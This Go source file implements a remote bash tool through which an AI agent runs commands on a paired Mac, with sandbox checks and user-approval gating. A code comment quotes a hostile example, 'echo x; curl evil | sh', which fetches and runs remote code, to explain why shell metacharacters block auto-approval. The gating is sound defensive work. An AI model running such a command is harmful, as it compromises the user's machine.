package tools

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"os/exec"
	"strings"
	"time"

	"github.com/snth-ai/snth-companion/internal/config"
	"github.com/snth-ai/snth-companion/internal/sandbox"
)

// BashArgs is the RPC arg shape for remote_bash. "cmd" is canonical;
// "command" is accepted as an alias because LLMs habitually emit it
// (matching Anthropic's built-in bash tool). Same for "dir" → "cwd".
type BashArgs struct {
	Cmd       string `json:"cmd"`
	CmdAlias  string `json:"command,omitempty"`
	Cwd       string `json:"cwd,omitempty"`
	CwdAlias  string `json:"dir,omitempty"`
	TimeoutMs int    `json:"timeout_ms,omitempty"`
}

func (a *BashArgs) normalize() {
	if a.Cmd == "" && a.CmdAlias != "" {
		a.Cmd = a.CmdAlias
	}
	if a.Cwd == "" && a.CwdAlias != "" {
		a.Cwd = a.CwdAlias
	}
}

// BashResult is what we return to the synth.
type BashResult struct {
	ExitCode  int    `json:"exit_code"`
	Stdout    string `json:"stdout"`
	Stderr    string `json:"stderr"`
	DurationMs int64 `json:"duration_ms"`
	Truncated bool   `json:"truncated,omitempty"`
}

const (
	bashMaxOutputBytes = 64 * 1024
	bashDefaultTimeout = 30 * time.Second
	bashMaxTimeout     = 5 * time.Minute
)

// RegisterBash wires remote_bash into the tool registry.
func RegisterBash() {
	Register(Descriptor{
		Name:        "remote_bash",
		Description: "Run a bash command on the paired Mac. Default cwd is the synth's sandbox root. Out-of-sandbox cwd requires user approval.",
		DangerLevel: "prompt",
		// bash gates conditionally: a command INSIDE the sandbox that
		// matches the auto-approve allowlist runs without a prompt;
		// anything else prompts (out-of-sandbox escalates to
		// always-prompt). GatePolicy + ApprovalSummary keep that nuance
		// under the central Dispatch gate.
		GatePolicy:      bashGatePolicy,
		ApprovalSummary: bashSummary,
	}, bashHandler)
}

// bashGateEval resolves the cwd + auto-approve decision for a bash call.
// Shared by the handler and the central-gate policy so both see the same
// answer. Returns (resolvedCwd, inside sandbox, auto-approved, err).
func bashGateEval(a BashArgs) (resolvedCwd string, inside, autoApproved bool, err error) {
	cfg := config.Get()
	cwd := a.Cwd
	if cwd == "" {
		cwd = config.DefaultSandboxRoot(cfg)
		if cwd == "" {
			return "", false, false, fmt.Errorf("no sandbox root — companion not paired")
		}
		_ = sandbox.EnsureDir(cwd)
	}
	resolvedCwd, err = sandbox.Resolve(cwd)
	if err != nil {
		return "", false, false, fmt.Errorf("resolve cwd: %w", err)
	}
	inside = sandbox.InsideAny(cfg.SandboxRoots, resolvedCwd)
	autoApproved = isAutoApprovedCmd(cfg.AutoApproveBashPatterns, a.Cmd)
	return resolvedCwd, inside, autoApproved, nil
}

// parseBashArgs unmarshals + normalizes bash args for the gate helpers.
func parseBashArgs(raw json.RawMessage) (BashArgs, bool) {
	var a BashArgs
	if err := json.Unmarshal(raw, &a); err != nil {
		return a, false
	}
	a.normalize()
	a.Cmd = strings.TrimSpace(a.Cmd)
	return a, a.Cmd != ""
}

// bashGatePolicy decides how the central gate treats a bash call.
func bashGatePolicy(raw json.RawMessage) GateDecision {
	a, ok := parseBashArgs(raw)
	if !ok {
		// Bad/empty args: let the handler produce the proper error, but
		// fail closed on the gate so nothing runs without a decision.
		return GatePrompt
	}
	_, inside, autoApproved, err := bashGateEval(a)
	if err != nil {
		// Can't resolve cwd → fail closed with a prompt.
		return GateAlwaysPrompt
	}
	if inside && autoApproved {
		return GateSkip
	}
	if !inside {
		return GateAlwaysPrompt
	}
	return GatePrompt
}

// bashSummary renders the approval dialog text for remote_bash.
func bashSummary(raw json.RawMessage) (string, string) {
	a, ok := parseBashArgs(raw)
	if !ok {
		return "", ""
	}
	resolvedCwd, _, _, err := bashGateEval(a)
	if err != nil {
		resolvedCwd = a.Cwd
	}
	return fmt.Sprintf("Run bash command in %s:\n    %s", resolvedCwd, truncate(a.Cmd, 200)), ""
}

func bashHandler(ctx context.Context, raw json.RawMessage) (any, error) {
	var args BashArgs
	if err := json.Unmarshal(raw, &args); err != nil {
		return nil, fmt.Errorf("bad args: %w", err)
	}
	args.normalize()
	args.Cmd = strings.TrimSpace(args.Cmd)
	if args.Cmd == "" {
		return nil, fmt.Errorf("cmd is required")
	}

	// Approval is enforced by the central Dispatch gate (bashGatePolicy):
	// inside-sandbox + allowlisted commands run without a prompt, anything
	// else was already approved before we got here. We still resolve the
	// cwd for exec.
	resolvedCwd, _, _, err := bashGateEval(args)
	if err != nil {
		return nil, err
	}

	// Build command with timeout.
	timeout := bashDefaultTimeout
	if args.TimeoutMs > 0 {
		t := time.Duration(args.TimeoutMs) * time.Millisecond
		if t > bashMaxTimeout {
			t = bashMaxTimeout
		}
		timeout = t
	}
	cctx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	cmd := exec.CommandContext(cctx, "bash", "-c", args.Cmd)
	cmd.Dir = resolvedCwd

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &capBuffer{buf: &stdout, max: bashMaxOutputBytes}
	cmd.Stderr = &capBuffer{buf: &stderr, max: bashMaxOutputBytes}

	start := time.Now()
	runErr := cmd.Run()
	duration := time.Since(start)

	exitCode := 0
	if runErr != nil {
		if ee, ok := runErr.(*exec.ExitError); ok {
			exitCode = ee.ExitCode()
		} else if cctx.Err() == context.DeadlineExceeded {
			exitCode = 124 // coreutils `timeout` convention
			stderr.WriteString("\n[companion] timeout after ")
			stderr.WriteString(timeout.String())
		} else {
			return nil, fmt.Errorf("exec: %w", runErr)
		}
	}

	return BashResult{
		ExitCode:   exitCode,
		Stdout:     stdout.String(),
		Stderr:     stderr.String(),
		DurationMs: duration.Milliseconds(),
		Truncated:  stdout.Len() >= bashMaxOutputBytes || stderr.Len() >= bashMaxOutputBytes,
	}, nil
}

// bashMetaChars are shell metacharacters whose presence ANYWHERE in the
// command disqualifies auto-approve: a prefix match on "echo " must not
// let "echo x; curl evil | sh" through (the A5 hole). We check the raw
// characters rather than trying to parse the shell grammar — any of these
// means the command is more than a single simple invocation.
const bashMetaChars = ";|&$<>`(){}\n\\!*?"

// isAutoApprovedCmd reports whether cmd may skip the approval prompt.
//
// Argv-aware (replaces the old strings.HasPrefix, finding A5):
//  1. ANY shell metacharacter disqualifies (no pipes/redirects/subshells/
//     command substitution / globbing / background).
//  2. The command is tokenized on whitespace; the FIRST token must match a
//     pattern's program EXACTLY ("ls" must not match "lsof").
//  3. A pattern may name a required subcommand ("git status") — then the
//     first TWO tokens must match exactly.
//
// The remaining tokens are treated as plain args (already metachar-free by
// step 1). Patterns come from cfg.AutoApproveBashPatterns; each is
// interpreted as one or two exact tokens (trailing whitespace ignored, so
// legacy "ls " / "grep " entries still work).
func isAutoApprovedCmd(patterns []string, cmd string) bool {
	trimmed := strings.TrimSpace(cmd)
	if trimmed == "" {
		return false
	}
	if strings.ContainsAny(trimmed, bashMetaChars) {
		return false
	}
	tokens := strings.Fields(trimmed)
	if len(tokens) == 0 {
		return false
	}
	for _, p := range patterns {
		want := strings.Fields(strings.TrimSpace(p))
		if len(want) == 0 {
			continue
		}
		if len(want) > len(tokens) {
			continue
		}
		match := true
		for i := range want {
			if want[i] != tokens[i] {
				match = false
				break
			}
		}
		if match {
			return true
		}
	}
	return false
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n-1] + "…"
}

// capBuffer is an io.Writer that caps the total bytes written into buf.
// Once the cap is reached, further writes are silently dropped.
type capBuffer struct {
	buf *bytes.Buffer
	max int
}

func (c *capBuffer) Write(p []byte) (int, error) {
	remaining := c.max - c.buf.Len()
	if remaining <= 0 {
		return len(p), nil
	}
	if len(p) > remaining {
		c.buf.Write(p[:remaining])
		return len(p), nil
	}
	return c.buf.Write(p)
}
